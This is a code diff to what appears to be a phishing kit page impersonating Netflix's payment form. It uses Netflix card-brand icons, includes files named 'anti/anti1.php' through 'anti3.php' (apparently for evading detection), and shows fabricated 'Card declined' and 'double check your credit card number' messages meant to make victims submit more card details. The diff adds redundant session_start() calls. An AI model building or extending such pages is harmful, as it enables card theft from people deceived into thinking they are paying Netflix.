@@ -1,4 +1,5 @@
 <?php
+session_start();
 include 'anti/anti1.php';
 include 'anti/anti2.php';
 include 'anti/anti3.php';
@@ -14588,12 +14589,14 @@ xmlns='http://www.w3.org/2000/svg'viewBox='0 0 511.626 511.627'%3E%3Cg fill='%23
                       <img alt="" class="logoIcon DISCOVER" data-uia="logoIcon-DISCOVER" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover.png" srcset="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_discover_2x.png 2x">
                     </span>
               <div style="color:red">
-                      <?php
+<?php
+session_start();
              if (isset($_GET['er']) && $_GET['er'] === 'true') {
            echo "<br>Card declined! Please use another one.";
           }
               ?>
-                 <?php
+<?php
+session_start();
              if (isset($_GET['er']) && $_GET['er'] === 'true2') {
            echo "<br>Please double check your credit card number!";
           }
